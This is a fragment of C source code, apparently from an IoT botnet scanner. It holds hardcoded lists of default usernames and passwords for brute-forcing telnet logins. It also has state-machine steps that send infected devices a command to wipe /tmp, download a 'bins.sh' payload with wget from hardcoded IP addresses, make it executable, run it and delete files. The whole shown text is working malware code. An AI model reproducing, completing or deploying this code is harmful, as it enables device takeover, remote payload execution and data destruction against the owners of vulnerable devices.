...
char *usernames[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "maxided\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "maxided\0"};
...
case 8:
{
if(send(fds[i].fd, "cd /tmp; rm -rf *; wget -q http://208.67.1.182/bins.sh; chmod +x bins.sh; sh bins.sh; rm -rf *\r\n", 96, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
fds[i].state = 9;
}
break;
case 9:
...
case 101:
{
if(send(fds[i].fd, "cd /tmp; rm -rf *; wget -q http://198.20.115.226/bins.sh; chmod +x bins.sh; sh bins.sh; rm -rf *\r\n", 98, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
fds[i].state = 102;
}
break;
case 102:
